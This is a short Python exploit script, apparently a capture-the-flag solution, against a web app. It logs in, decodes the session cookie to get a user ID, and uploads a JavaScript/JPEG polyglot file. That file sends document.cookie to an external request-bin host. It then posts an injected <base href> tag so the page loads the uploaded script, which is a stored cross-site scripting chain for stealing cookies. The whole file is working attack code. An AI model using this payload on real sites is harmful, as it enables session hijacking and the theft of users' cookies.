import requests
import re
import base64
import json
import os

URL = 'http://{}:{}'.format(os.getenv("HOST", "localhost"), os.getenv("PORT", "8011"))

def decode_base64(data):
    data = re.sub(r'[^-a-zA-Z0-9_]+', '', data)
    missing_padding = len(data) % 4
    if missing_padding:
        data += '='* (4 - missing_padding)
    return base64.b64decode(data, '-_').decode()

# login
cred = {'username': 'niko7654321', 'password': 'bulb'}
r = requests.post(f'{URL}/login', data=cred, allow_redirects=False)
cookies = r.cookies
user_id = json.loads(decode_base64(cookies['session'].split('.')[0]))['user_id']
print(f"[+] user_id = {user_id}")

# upload
exploit  = b'nyan/*JFIF*/=1;'
exploit += b'''location.href="https://ptsv2.com/t/09vhd-1630128936/post?a="+document.cookie;'''
files = {'images[]': ('show_utils.js', exploit, 'image/jpeg')}
r = requests.post(f'{URL}/upload', files=files, cookies=cookies)

# post
payload = {
    'title': 'exploit',
    'contents': f'<base href="/uploads/{user_id}/XXX/YYY/">'
}
r = requests.post(f'{URL}/post', data=payload, cookies=cookies)
print(re.findall("value=\"(http://.+)\" id=", r.text)[0])
